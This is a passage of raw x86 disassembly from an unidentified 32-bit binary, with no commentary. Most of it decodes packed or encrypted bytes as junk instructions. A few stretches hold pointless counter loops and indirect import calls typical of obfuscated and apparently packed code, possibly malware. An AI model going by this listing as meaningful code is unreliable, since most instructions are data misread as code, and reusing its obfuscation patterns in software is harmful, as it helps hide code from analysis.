  4197f5:	cmp    esi,DWORD PTR [ecx]
  4197f7:	stos   DWORD PTR es:[edi],eax
  4197f8:	push   DWORD PTR [esi-0x17e5633c]
  4197fe:	stos   DWORD PTR es:[edi],eax
  4197ff:	es pushf 
  419801:	mov    esi,eax
  419803:	rcl    DWORD PTR [esi-0x4f],1
  419806:	rol    DWORD PTR [ecx+0x35d7ad8b],cl
  41980c:	push   cs
  41980d:	sbb    eax,edx
  41980f:	inc    DWORD PTR [ebp+0x59d51edf]
  419815:	xor    eax,0x9f3e6498
  41981a:	xor    DWORD PTR [edx],0x82dde84b
  419820:	out    dx,al
  419821:	ror    BYTE PTR [edx],1
  419823:	pop    eax
  419824:	jne    0x41982c
  419826:	das    
  419827:	stc    
  419828:	jecxz  0x419845
  41982a:	sbb    edi,DWORD PTR [ebx+0x7b96e30e]
  419830:	xchg   edi,eax
  419831:	mov    ?,WORD PTR [ebp+0x6f]
  419834:	stos   BYTE PTR es:[edi],al
  419835:	inc    esi
  419836:	(bad)
  419839:	pop    ebx
  41983a:	stc    
  41983b:	aam    0xd
  41983d:	mov    DWORD PTR [edi-0x49],eax
  419840:	or     cl,cl
  419842:	lods   al,BYTE PTR ds:[esi]
  419843:	fidivr WORD PTR [ecx]
  419845:	cld    
  419846:	add    eax,0xa2a98737
  41984b:	add    ah,BYTE PTR [ebx-0x3fc5a458]
  419851:	jg     0x419836
  419853:	xor    eax,0x7a387061
  419858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419859:	jg     0x4198a9
  41985b:	stc    
  41985c:	xor    BYTE PTR [edi+ebp*2+0x15],ch
  419860:	pop    edi
  419861:	add    eax,0x2650ba0f
  419866:	fdivp  st(3),st
  419868:	call   0x4b95123d
  41986d:	add    esp,eax
  41986f:	ja     0x419831
  419871:	jl     0x50e2422e
  419877:	call   0xd469e26e
  41987c:	les    edx,FWORD PTR [edi]
  41987e:	xor    dh,cl
  419880:	into   
  419881:	(bad)  
  419882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419883:	or     eax,0xd1c41cd8
  419888:	add    DWORD PTR [edi+ebp*8-0x27c73d42],ecx
  41988f:	out    0xcb,eax
  419891:	mov    ds:0xd121647f,eax
  419896:	push   es
  419897:	push   ebx
  419898:	mov    al,ds:0x72fd3d9e
  41989d:	pop    esp
  41989e:	dec    edi
  41989f:	outs   dx,DWORD PTR ds:[esi]
  4198a0:	cmp    dh,BYTE PTR [esp+ebp*4+0x1a]
  4198a4:	cli    
  4198a5:	daa    
  4198a6:	call   0xd37d532e
  4198ab:	jno    0x419928
  4198ad:	mov    dl,0x57
  4198af:	fs pop ds
  4198b1:	sar    esi,0xd0
  4198b4:	xor    bh,BYTE PTR [edx+0x57]
  4198b7:	xchg   BYTE PTR [ecx+esi*4+0x3b315146],al
  4198be:	ja     0x4198bf
  4198c0:	push   esi
  4198c1:	cli    
  4198c2:	jns    0x41987a
  4198c4:	sub    esi,DWORD PTR [esi-0x66]
  4198c7:	inc    ebx
  4198c8:	jg     0x41988e
  4198ca:	in     eax,0xac
  4198cc:	or     edx,DWORD PTR [esi-0x69]
  4198cf:	push   eax
  4198d0:	dec    edx
  4198d1:	pop    ss
  4198d2:	je     0x4198b0
  4198d4:	in     eax,0x3c
  4198d6:	cli    
  4198d7:	fisttp DWORD PTR [ecx+0x7eb1b0ab]
  4198dd:	rol    BYTE PTR [ebp-0x19f53740],cl
  4198e3:	lahf   
  4198e4:	add    eax,0x2303dcc0
  4198e9:	fucom  st(2)
  4198eb:	pop    esi
  4198ec:	mov    ebx,0xf3f41632
  4198f1:	fimul  DWORD PTR [edx-0x71]
  4198f4:	pminsw mm1,QWORD PTR [eax]
  4198f7:	push   ss
  4198f8:	or     ebx,0x37
  4198fb:	xchg   ebx,eax
  4198fc:	sbb    eax,0xdbbe6a5b
  419901:	int3   
  419902:	scas   al,BYTE PTR es:[edi]
  419903:	xchg   edx,eax
  419904:	popf   
  419905:	jp     0x41992a
  419907:	add    al,0x26
  419909:	mov    cl,0x8c
  41990b:	int    0x72
  41990d:	jl     0x41991f
  41990f:	lods   al,BYTE PTR ds:[esi]
  419910:	gs int 0x4f
  419913:	(bad)  
  419915:	mov    ch,0xf0
  419917:	push   0x1b5f2fe2
  41991c:	adc    ch,ah
  41991e:	mov    ebx,edi
  419920:	mov    ds:0x3f857054,eax
  419925:	add    edi,DWORD PTR [ebx-0x29b9f1a1]
  41992b:	arpl   WORD PTR [edx+0x57],si
  41992e:	mov    esp,0x8ca6f9e9
  419933:	outs   dx,BYTE PTR ds:[esi]
  419934:	and    DWORD PTR [esi+0x5a47e792],esp
  41993a:	imul   esp,DWORD PTR [ebp-0x66],0x6f6aee32
  419941:	mov    ch,0x36
  419943:	leave  
  419944:	sbb    edx,DWORD PTR [ebx+0x7dd07e9c]
  41994a:	mov    ch,0x2b
  41994c:	nop
  41994d:	mov    ebx,0x1ca10bfb
  419952:	jb     0x4198fe
  419954:	mov    BYTE PTR [ecx+0x7f5aba9],bl
  41995a:	jae    0x4199ae
  41995c:	retf   
  41995d:	mov    DWORD PTR [ebp+0x1ff1d632],ecx
  419963:	xor    ebp,DWORD PTR [eax]
  419965:	ret    
  419966:	and    ebx,DWORD PTR [edi]
  419968:	fstp   QWORD PTR ds:0x42fe7125
  41996e:	push   ebx
  41996f:	inc    esi
  419970:	out    0xe1,eax
  419972:	xor    BYTE PTR [ebx+0x4d],ch
  419975:	(bad)  
  419976:	mov    WORD PTR [eax+0x62],ss
  419979:	or     ebx,ebp
  41997b:	xor    ah,0x55
  41997e:	inc    DWORD PTR [esi+0x12]
  419981:	pop    esi
  419982:	leave  
  419983:	out    0x18,eax
  419985:	sar    BYTE PTR [esi+0x5c490eeb],0x14
  41998c:	sahf   
  41998d:	sub    DWORD PTR [ebx-0x57],eax
  419990:	xor    bh,BYTE PTR [esi-0x77]
  419993:	pop    ebp
  419994:	stos   BYTE PTR es:[edi],al
  419995:	inc    esp
  419996:	adc    BYTE PTR [esi-0x75073b9d],bl
  41999c:	sar    ah,cl
  41999e:	std    
  41999f:	mov    cl,BYTE PTR [edi+esi*2]
  4199a2:	cmp    bh,cl
  4199a4:	loopne 0x419985
  4199a6:	test   eax,0x5b65637c
  4199ab:	rcr    DWORD PTR [esi],1
  4199ad:	push   ss
  4199ae:	inc    eax
  4199af:	xchg   edx,eax
  4199b0:	mov    ecx,0xe2e8e9bb
  4199b5:	repz push eax
  4199b7:	stc    
  4199b8:	lock rcl BYTE PTR [ebx],1
  4199bb:	fbstp  TBYTE PTR [eax-0x28d4d1f8]
  4199c1:	adc    ecx,0x1fe4
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42a80d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42a881,0x12
  4199e0:	cmp    DWORD PTR ds:0x42a881,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42a881,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42a881
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42a881,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42a765,0x1b
  419a31:	cmp    DWORD PTR ds:0x42a765,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42a765,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42a765,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42a765
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42a765,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42a765
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42a765,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42a805,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42a849,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42a7b5
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42a83d,0x42a7b1
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42a881,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42a881
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42a881,eax
  419ac8:	cmp    DWORD PTR ds:0x42a881,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42a881,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42a805
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42a7cd
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42a845
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0x1b
  419b14:	pop    ds
  419b15:	sti    
  419b16:	jb     0x419ae8
  419b18:	iret   
  419b19:	jg     0x419b93
  419b1b:	adc    BYTE PTR [esi+0x78],bh
  419b1e:	js     0x419b3c
  419b20:	jg     0x419ac1
  419b22:	push   0xb30e8b5c
  419b27:	xor    eax,0x3d55a843
  419b2c:	rol    DWORD PTR [edi],0x7b
  419b2f:	and    BYTE PTR [eax],ah
  419b31:	rol    DWORD PTR [eax],0xd4
  419b34:	sar    esi,cl
  419b36:	in     al,0x22
  419b38:	aam    0xd0
  419b3a:	inc    edi
  419b3b:	xchg   edi,eax
  419b3c:	ret    
  419b3d:	je     0x419b76
  419b3f:	xchg   ecx,eax
  419b40:	fwait
  419b41:	and    BYTE PTR [esi-0x7fbcc4d0],0x44
  419b48:	setno  BYTE PTR [ebp+ecx*8+0x16057837]
  419b50:	je     0x419bc4
  419b52:	(bad)  ds:0xbcb527cc
  419b58:	(bad)  
  419b59:	repnz scas eax,DWORD PTR es:[edi]
  419b5b:	iret   
  419b5c:	not    DWORD PTR [ecx]
  419b5e:	push   esi
  419b5f:	or     bh,BYTE PTR [ecx]
  419b61:	(bad)  
  419b62:	xchg   esi,eax
  419b63:	ror    BYTE PTR ds:0x47521f30,1
  419b69:	jp     0x419ba6
  419b6b:	jbe    0x419b87
  419b6d:	je     0x419b58
  419b6f:	into   
  419b70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b71:	or     DWORD PTR [ebx+eiz*4],ebp
  419b74:	fisttp QWORD PTR [eax]
  419b76:	pop    ds
  419b77:	and    al,0x13
  419b79:	mov    ch,BYTE PTR fs:[ebp+ecx*2+0x36]
  419b7e:	sar    esi,0x7d
  419b81:	pop    ds
  419b82:	mov    bh,0xbb
  419b84:	jbe    0x419bec
  419b86:	pop    esi
  419b87:	shr    BYTE PTR [esi+0x5c],1
  419b8a:	mov    al,0x6b
  419b8c:	shl    edx,cl
  419b8e:	(bad)  
  419b8f:	std    
  419b90:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  419b92:	fild   WORD PTR [edx+edi*8]
  419b95:	xchg   ecx,eax
  419b96:	sub    DWORD PTR [ecx],esi
  419b98:	cwde   
  419b99:	cwde   
  419b9a:	shl    DWORD PTR [ecx],1
  419b9c:	pop    es
  419b9d:	ins    BYTE PTR es:[edi],dx
  419b9e:	jge    0x419bff
  419ba0:	dec    eax
  419ba1:	add    DWORD PTR [ebx-0x4668763],esi
  419ba7:	cmc    
  419ba8:	outs   dx,DWORD PTR ds:[esi]
  419ba9:	lods   eax,DWORD PTR ds:[esi]
  419baa:	pushf  
  419bab:	sbb    ah,BYTE PTR [ecx]
  419bad:	adc    WORD PTR [esi-0x1ae02c3c],dx
  419bb4:	mov    ds:0x148618,al
  419bb9:	mov    WORD PTR [edx-0xf],?
  419bbc:	pop    ds
  419bbd:	xchg   ebp,eax
  419bbe:	call   0xb4528723
  419bc3:	lea    edi,[ebx-0x5a]
  419bc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bc7:	pop    edx
  419bc8:	sbb    bh,BYTE PTR [eax+eiz*4]
  419bcb:	xchg   edi,eax
  419bcc:	adc    DWORD PTR [edx],0xcbbbdf8f
  419bd2:	ins    DWORD PTR es:[edi],dx
  419bd3:	push   0xffffffc8
  419bd5:	popa   
  419bd6:	in     al,0x5c
  419bd8:	ins    BYTE PTR es:[edi],dx
  419bd9:	not    DWORD PTR [ebx]
  419bdb:	daa    
  419bdc:	xchg   esi,eax
  419bdd:	jp     0x419c2f
  419bdf:	movnti DWORD PTR [esi],ecx
  419be2:	shl    BYTE PTR [edx],1
  419be4:	imul   ebp,DWORD PTR [ecx-0x2f],0xb3c8688b
  419beb:	sub    ecx,DWORD PTR [eax]
  419bed:	and    DWORD PTR [ebp-0x45],ecx
  419bf0:	loope  0x419c49
  419bf2:	fs cmp eax,0x69166cd3
  419bf8:	mov    eax,ds:0x19613bb1
  419bfd:	xchg   esp,eax
  419bfe:	fucomip st,st(2)
  419c00:	adc    DWORD PTR [eax+eax*2-0x79],esp
  419c04:	(bad)  
  419c05:	jnp    0x419c0b
  419c07:	xchg   esi,eax
  419c08:	sbb    eax,edi
  419c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c0b:	xor    eax,0x46024bf1
  419c10:	mov    eax,0xa4a9d8fd
  419c15:	mov    ds:0x8e02ae22,al
  419c1a:	cdq    
  419c1b:	test   DWORD PTR [esi-0x46d1c972],esp
  419c21:	sbb    DWORD PTR [edx+ecx*4+0x4131baa],eax
  419c28:	mov    ah,0xcd
  419c2a:	shr    BYTE PTR [eax-0x6c],cl
  419c2d:	test   eax,0x48f7d49f
  419c32:	jmp    0xdde81eb7
  419c37:	fs mov ch,0xe
  419c3a:	test   al,0x50
  419c3c:	retf   0x14b6
  419c3f:	test   DWORD PTR [ecx],ebx
  419c41:	mov    esp,0xce0cad60
  419c46:	mov    ds,WORD PTR [ebp-0x4a991dbe]
  419c4c:	fcomp  QWORD PTR [eax+0x67d47d5f]
  419c52:	cs rcl ebp,0x3a
  419c56:	sti    
  419c57:	pop    ds
  419c58:	xor    DWORD PTR [edi+0x6f247206],0xc
  419c5f:	inc    esi
  419c60:	cmp    eax,0xa95d87c4
  419c65:	cmp    bl,BYTE PTR [edi]
  419c67:	mov    eax,0x54426b1b
  419c6c:	xor    eax,0x46c0bf83
  419c71:	and    DWORD PTR [ecx-0x6505bf08],edx
  419c77:	aad    0x18
  419c79:	mov    ebp,0x6436bfcd
  419c7e:	dec    DWORD PTR [ebx-0x27]
  419c81:	dec    ebx
  419c82:	iret   
  419c83:	stos   BYTE PTR es:[edi],al
  419c84:	lds    edx,FWORD PTR [edi+0x48ab655b]
  419c8a:	pop    edx
  419c8b:	ffree  st(7)
  419c8d:	sti    
  419c8e:	(bad)  
  419c8f:	xor    BYTE PTR [edi+0x7ae1e860],al
  419c95:	cwde   
  419c96:	fdiv   DWORD PTR [esi+0x151ff682]
  419c9c:	rol    al,0x50
  419c9f:	adc    al,dl
  419ca1:	xchg   DWORD PTR [edi+0xc],esp
  419ca4:	sub    eax,0xa16d74ac
  419ca9:	jp     0x419d0d
  419cab:	xor    BYTE PTR [edx],dl
  419cad:	mov    ecx,DWORD PTR [eax+0x7e]
  419cb0:	out    0xbf,eax
  419cb2:	stos   DWORD PTR es:[edi],eax
  419cb3:	xor    eax,0xd850b8ce
  419cb8:	sub    eax,0x73031d6a
  419cbd:	lahf   
  419cbe:	mov    ebp,0x1b674011
  419cc3:	xor    eax,0xa2330b1e
  419cc8:	icebp  
  419cc9:	cmp    eax,DWORD PTR [esi-0x458cacd4]
  419ccf:	add    dl,BYTE PTR gs:0xfcee5485
  419cd6:	(bad)  
  419cd7:	in     eax,dx
  419cd8:	test   DWORD PTR [ecx+0x66ad841c],ebx
  419cde:	out    0x54,al
  419ce0:	repnz not bh
  419ce3:	pusha  
  419ce4:	jmp    0xa223b108
  419ce9:	dec    edx
  419cea:	and    al,0x6e
  419cec:	retf   
  419ced:	(bad)  
  419cee:	mov    cl,0x53
  419cf0:	pop    ss
  419cf1:	xlat   BYTE PTR fs:[ebx]
  419cf3:	mov    edi,0x12e2c41d
  419cf8:	mov    edx,esi
  419cfa:	cmp    BYTE PTR [esi-0x1078b27a],dl
  419d00:	aam    0x46
  419d02:	inc    eax
  419d03:	xor    edx,DWORD PTR gs:[eax+0x13636487]
  419d0a:	and    DWORD PTR [ecx+0x2],ebx
  419d0d:	leave  
  419d0e:	or     DWORD PTR [ebx],0x6c
  419d11:	mov    esi,0x62b3ae1a
  419d16:	push   esp
  419d17:	inc    ecx
  419d18:	std    
  419d19:	pop    ecx
  419d1a:	aad    0x8c
  419d1c:	loope  0x419d50
  419d1e:	add    BYTE PTR [ebp-0x1ff4a2ac],ch
  419d24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d25:	dec    edx
  419d26:	jecxz  0x419ccf
  419d28:	dec    esi
  419d29:	mov    ebp,cs
  419d2b:	fnstsw WORD PTR [ebx+0x2b]
  419d2e:	ja     0x419d08
  419d30:	imul   esi,DWORD PTR [edi-0x1b0a2517],0x22
  419d37:	mov    eax,DWORD PTR [ebp-0x20]
  419d3a:	je     0x41a8c9
  419d40:	inc    eax
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42a839,0x42a76d
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42a889,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42a83d,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	js     0x419d1a
  419d7e:	add    eax,0x7fcde82c
  419d83:	js     0x419d95
  419d85:	jle    0x419dff
  419d87:	js     0x419d7f
  419d89:	loop   0x419dfd
  419d8b:	imul   esp,DWORD PTR [edx],0x1
  419d8e:	in     al,dx
  419d8f:	retf   0xd55b
  419d92:	jae    0x419db3
  419d94:	int3   
  419d95:	mov    ch,0x24
  419d97:	mov    edi,0x4a16ed2e
  419d9c:	ins    BYTE PTR es:[edi],dx
  419d9d:	iret   
  419d9e:	jne    0x419dc1
  419da0:	retf   0x10c4
  419da3:	push   cs
  419da4:	add    edx,esi
  419da6:	inc    esi
  419da7:	fld    QWORD PTR [ecx-0x56c00317]
  419dad:	xchg   ebx,eax
  419dae:	and    ch,bh
  419db0:	dec    edi
  419db1:	inc    esi
  419db2:	pop    es
  419db3:	xchg   edx,eax
  419db4:	inc    ebx
  419db5:	jle    0x419e32
  419db7:	fs mov edi,0xe27c8a79
  419dbd:	jge    0x419ddd
  419dbf:	jne    0x419d9c
  419dc1:	into   
  419dc2:	ret    
  419dc3:	push   cs
  419dc4:	pop    esp
  419dc5:	mov    ebp,0x576ee34
  419dca:	ss pop ecx
  419dcc:	inc    eax
  419dcd:	cmp    DWORD PTR [ebx],0xffffffc6
  419dd0:	arpl   WORD PTR [esi+0x39],bp
  419dd3:	adc    eax,0x83f17238
  419dd8:	repnz sbb BYTE PTR [edx],0x29
  419ddc:	mov    dh,dh
  419dde:	neg    ch
  419de0:	test   DWORD PTR [ecx],edx
  419de2:	cli    
  419de3:	sbb    BYTE PTR [esi],cl
  419de5:	cmp    edi,DWORD PTR [ecx]
  419de7:	push   esp
  419de8:	mov    DWORD PTR [edi-0x6c],edx
  419deb:	jecxz  0x419e54
  419ded:	fnstenv [eax-0x3b]
  419df0:	mov    ah,0x4f
  419df2:	dec    ebp
  419df3:	adc    edi,DWORD PTR [ebx+ecx*2-0x6a]
  419df7:	or     al,0x91
  419df9:	xchg   dl,dl
  419dfb:	ror    BYTE PTR ds:0xa34eebc7,cl
  419e01:	mov    dh,BYTE PTR [edx-0x69]
  419e04:	mov    dl,0xa9
  419e06:	in     al,dx
  419e07:	and    DWORD PTR [esi],edx
  419e09:	inc    edx
  419e0a:	ror    DWORD PTR [ecx],cl
  419e0c:	mov    WORD PTR [ebx-0x3377badc],ss
  419e12:	call   0x12186000
  419e17:	pop    esi
  419e18:	mov    ah,0xfa
  419e1a:	mov    edx,DWORD PTR [ebp-0x7ca5b8c2]
  419e20:	fs aam 0x77
  419e23:	and    eax,0xd5f9c9c3
  419e28:	stos   DWORD PTR es:[edi],eax
  419e29:	dec    esi
  419e2a:	stos   DWORD PTR es:[edi],eax
  419e2b:	out    dx,eax
  419e2c:	mov    es,WORD PTR [ecx-0x70c3e51b]
  419e32:	adc    eax,0xb6c707f5
  419e37:	xor    ecx,DWORD PTR [esi-0x2c]
  419e3a:	ja     0x419dee
  419e3c:	mov    bh,0x50
  419e3e:	xor    eax,0xf741790a
  419e43:	in     al,0xf5
  419e45:	fstp   TBYTE PTR [ecx+0x1afd4a9a]
  419e4b:	jns    0x419e20
  419e4d:	adc    DWORD PTR [edi+0x29b8485a],esp
  419e53:	sbb    al,0x44
  419e55:	mov    ch,0xae
  419e57:	sub    eax,0x914a2e85
  419e5c:	sbb    ebp,ecx
  419e5e:	add    al,0xf3
  419e60:	rcl    DWORD PTR [eax+edx*1-0x74a6a2e9],0xd1
  419e68:	jmp    0x419e46
  419e6a:	imul   esp,esi,0xc8c92e9
  419e70:	jecxz  0x419e92
  419e72:	sub    DWORD PTR [ecx-0x5c],ecx
  419e75:	ficomp WORD PTR [esi]
  419e77:	sub    DWORD PTR ds:0x698c99c8,edx
  419e7d:	mov    al,ds:0x11114a3c
  419e82:	and    ah,BYTE PTR [esi+0x57cd40a0]
  419e88:	dec    ebp
  419e89:	xchg   ebx,eax
  419e8a:	hlt    
  419e8b:	call   0x1deba7e5
  419e90:	scas   eax,DWORD PTR es:[edi]
  419e91:	push   es
  419e92:	mov    bl,0x99
  419e94:	(bad)  
  419e95:	leave  
  419e96:	mov    edi,eax
  419e98:	fnsave [esi+0x946179c]
  419e9e:	imul   esp,DWORD PTR [edi],0x40
  419ea1:	test   eax,0x4a91655d
  419ea6:	lods   al,BYTE PTR ds:[esi]
  419ea7:	in     al,0x8e
  419ea9:	(bad)  
  419eaa:	ins    DWORD PTR es:[edi],dx
  419eab:	inc    edi
  419eac:	cmp    edi,DWORD PTR [eax+0x74]
  419eaf:	mov    al,ds:0x6e790169
  419eb4:	sbb    al,BYTE PTR [eax]
  419eb6:	shl    ebp,cl
  419eb8:	in     al,0xe6
  419eba:	dec    esp
  419ebb:	sub    BYTE PTR [edi],ch
  419ebd:	or     DWORD PTR [edi-0x2c],0x37bfa6e4
  419ec4:	std    
  419ec5:	and    eax,0x2b26d8b8
  419eca:	mov    eax,ds:0x7f4d1796
  419ecf:	(bad)  
  419ed0:	(bad)  
  419ed1:	test   WORD PTR [esi],bp
  419ed4:	push   0x3ffdd5b9
  419ed9:	das    
  419eda:	lods   al,BYTE PTR ds:[esi]
  419edb:	and    eax,0xb3a071e3
  419ee0:	in     al,0xee
  419ee2:	test   DWORD PTR [edi],edx
  419ee4:	test   DWORD PTR [ecx-0x4e],ebp
  419ee7:	scas   eax,DWORD PTR es:[edi]
  419ee8:	sbb    BYTE PTR [eax+0x449b150],dh
  419eee:	or     edi,DWORD PTR [edx+0x2fa24cfa]
  419ef4:	test   BYTE PTR ds:0xc6ae10f7,ah
  419efa:	sbb    ch,BYTE PTR [esi-0x5591328f]
  419f00:	pop    ebx
  419f01:	sbb    eax,0xe08e1ebf
  419f06:	ins    BYTE PTR es:[edi],dx
  419f07:	mov    ch,0xd9
  419f09:	sub    BYTE PTR [eax+0x6263de5d],cl
  419f0f:	xor    ecx,edi
  419f11:	add    al,0x7c
  419f13:	push   ecx
  419f14:	jp     0x419ea7
  419f16:	das    
  419f17:	lods   eax,DWORD PTR ds:[esi]
  419f18:	jl     0x419f96
  419f1a:	adc    ebx,eax
  419f1c:	push   es
  419f1d:	mov    ah,BYTE PTR [ecx+0x1c]
  419f20:	sar    DWORD PTR [edx+eiz*2],1
  419f23:	inc    ecx
  419f24:	mov    eax,ds:0x50fd5312
  419f29:	cdq    
  419f2a:	cwde   
  419f2b:	std    
  419f2c:	shl    DWORD PTR [esi],0x3b
  419f2f:	push   cs
  419f30:	and    ecx,DWORD PTR [ebp+0x1b478cb3]
  419f36:	jle    0x419f55
  419f38:	retf   0xcd8d
  419f3b:	rcl    BYTE PTR [eax],0x44
  419f3e:	jmp    0x419f11
  419f40:	pop    edx
  419f41:	add    bl,ch
  419f43:	push   0xfffffff2
  419f45:	mov    cl,0x4f
  419f47:	jne    0x419f1d
  419f49:	jbe    0x419f3b
  419f4b:	mov    ah,0xe2
  419f4d:	mov    bl,0x3
  419f4f:	aad    0xe6
  419f51:	in     eax,0xf5
  419f53:	add    BYTE PTR [esi],dl
  419f55:	cmp    edi,ecx
  419f57:	lock jne 0x419f36
  419f5a:	push   0x918c4d2a
  419f5f:	and    bl,BYTE PTR [eax]
  419f61:	stos   DWORD PTR es:[edi],eax
  419f62:	inc    esp
  419f63:	adc    DWORD PTR [esi-0x10],0xffffff90
  419f67:	or     DWORD PTR [ebp+0x2fe4dd68],esi
  419f6d:	xchg   edi,eax
  419f6e:	stc    
  419f6f:	fiadd  DWORD PTR [eax]
  419f71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f72:	popa   
  419f73:	lods   eax,DWORD PTR ds:[esi]
  419f74:	add    esp,ecx
  419f76:	xchg   edx,eax
  419f77:	xor    al,0x85
  419f79:	test   edi,ebx
  419f7b:	ret    
  419f7c:	jle    0x419f5e
  419f7e:	ds sub dl,cl
  419f81:	jo     0x419f89
  419f83:	mov    bh,0xb8
  419f85:	jnp    0x419fd1
  419f87:	fldcw  WORD PTR [ebx+0x3108b82d]
  419f8d:	xchg   esp,eax
  419f8e:	mov    bh,0x41
  419f90:	jmp    0x66e3:0x4707f48e
  419f97:	jb     0x419fb4
  419f99:	inc    dh
  419f9b:	gs ret 0x92cf
  419f9f:	jg     0x419fb0
  419fa1:	test   DWORD PTR [ecx-0x7efffffa],edx
  419fa7:	add    eax,0x42a7c5
  419fac:	popa   
  419fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fae:	inc    edx
  419faf:	add    bh,bh
  419fb1:	jne    0x419fbb
  419fb3:	or     DWORD PTR ds:0x42a871,0x48c2
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42a835,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0x8f
  419fdd:	and    edx,ecx
  419fdf:	pop    DWORD PTR [eax+0x10787fd3]
  419fe5:	jle    0x41a05f
  419fe7:	js     0x41a052
  419fe9:	and    edx,esi
  419feb:	in     eax,0x43
  419fed:	xchg   ebp,eax
  419fee:	lock pop edx
  419ff0:	arpl   dx,dx
  419ff2:	stc    
  419ff3:	(bad)  
  419ff4:	jecxz  0x41a053
  419ff6:	ror    BYTE PTR ds:0x4decb839,0x9d
  419ffd:	jmp    0xa43df525
  41a002:	je     0x419f9f
  41a004:	(bad)  
  41a006:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41a008:	push   esp
  41a009:	ret    
  41a00a:	dec    ecx
  41a00b:	jnp    0x419fbb
  41a00d:	test   BYTE PTR [edi],bh
  41a00f:	pop    ebx
  41a010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a011:	in     eax,0x6d
  41a013:	xor    al,0x7f
  41a015:	icebp  
  41a016:	sub    al,0x98
  41a018:	ss aas 
  41a01a:	jb     0x41a026
  41a01c:	cdq    
  41a01d:	xchg   ebx,eax
  41a01e:	fisttp QWORD PTR [eax-0x40]
  41a021:	dec    esp
  41a022:	lods   eax,DWORD PTR ds:[esi]
  41a023:	inc    ebx
  41a024:	test   DWORD PTR [edx+ebp*2-0xc61e882],ebx
  41a02b:	mov    DWORD PTR [eax-0x27],esi
  41a02e:	clc    
  41a02f:	adc    al,0x8a
  41a031:	xchg   ecx,eax
  41a032:	mov    ch,bh
  41a034:	(bad)  
  41a035:	(bad)  
  41a036:	je     0x41a090
  41a038:	outs   dx,DWORD PTR ds:[esi]
  41a039:	push   ebp
  41a03a:	(bad)  
  41a03b:	repnz mov dl,0xce
  41a03e:	and    al,0x14
  41a040:	sahf   
  41a041:	ficom  DWORD PTR [edi-0x64c6e7f8]
  41a047:	sbb    DWORD PTR [edx+0x54541b78],ebp
  41a04d:	push   cs
  41a04e:	dec    BYTE PTR [eax]
  41a050:	jmp    0x3137:0x432ed31f
  41a057:	test   cl,0x6
  41a05a:	push   ss
  41a05b:	mov    ebx,0x82cdfc3d
  41a060:	jmp    0xb7bc:0x5cc5e17f
